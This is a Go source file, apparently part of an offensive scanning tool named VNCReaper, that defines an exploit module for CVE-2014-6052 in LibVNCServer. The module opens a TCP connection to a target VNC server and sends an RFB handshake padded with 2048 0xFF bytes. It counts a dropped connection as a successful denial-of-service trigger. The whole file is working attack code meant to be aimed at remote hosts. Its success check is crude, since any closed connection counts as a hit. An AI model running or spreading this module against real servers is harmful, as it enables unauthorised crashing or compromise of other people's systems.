package cves

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/comedymoon/VNCReaper/internal/types"
)

// CVE-2014-6052 - LibVNCServer heap overflow (rfbProcessClientNormalMessage variant)
type CVE2014_6052 struct{}

func (c CVE2014_6052) Name() string {
	return "CVE-2014-6052"
}

func (c CVE2014_6052) Description() string {
	return "LibVNCServer heap buffer overflow in rfbProcessClientNormalMessage (different code path from CVE-2014-6051), allows DoS or RCE."
}

func (c CVE2014_6052) Exploit(target types.ScanResult) (bool, string) {
	// Only target RFB servers
	if !strings.EqualFold(target.Protocol, "RFB") {
		return false, ""
	}

	address := net.JoinHostPort(target.IP, target.Port)
	conn, err := net.DialTimeout("tcp", address, 5*time.Second)
	if err != nil {
		return false, ""
	}
	defer conn.Close()

	// Malicious handshake triggering second vulnerable path
	payload := []byte("RFB 003.003\n" + strings.Repeat("\xFF", 2048))
	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
	_, err = conn.Write(payload)
	if err != nil {
		return false, ""
	}

	// Observe if connection drops immediately (likely DoS trigger)
	buf := make([]byte, 12)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	_, err = conn.Read(buf)
	if err != nil {
		return true, fmt.Sprintf("Server at %s closed connection after CVE-2014-6052 test payload", address)
	}

	return false, ""
}

func init() {
	Register(CVE2014_6052{})
}